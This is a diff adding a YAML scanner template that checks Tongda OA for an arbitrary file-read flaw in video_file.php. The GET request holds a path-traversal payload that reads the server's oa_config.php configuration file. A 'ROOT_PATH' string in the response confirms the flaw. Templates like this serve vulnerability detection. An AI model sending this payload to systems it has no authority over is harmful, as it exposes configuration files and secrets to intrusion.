@@ -1,0 +1,12 @@
+name: 通达OA-video_file-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
+    expression:
+      status: 200
+      body_all:
+        - "ROOT_PATH"
